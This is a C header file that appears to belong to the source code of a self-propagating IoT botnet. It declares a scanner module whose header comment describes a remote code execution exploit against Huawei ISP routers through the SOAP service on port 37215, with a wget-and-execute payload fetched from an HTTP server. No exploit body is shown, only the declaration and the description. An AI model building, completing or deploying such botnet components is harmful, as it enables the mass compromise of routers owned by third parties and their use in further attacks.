#ifndef _HUAWEI_H
#define _HUAWEI_H

/* ============================================================================
 * HUAWEI SOAP SCANNER - ISP Router Exploitation (Port 37215)
 * ============================================================================
 * Exploit: DeviceConfig SOAP RCE via Upgrade action
 * Targets: Huawei ISP routers globally (Africa, Middle East, Asia, LatAm)
 * Payload: wget + execute from HTTP server
 * ============================================================================ */

#include "includes.h"

#ifdef SELFREP
void huawei_scanner_init(void);
#endif

#endif
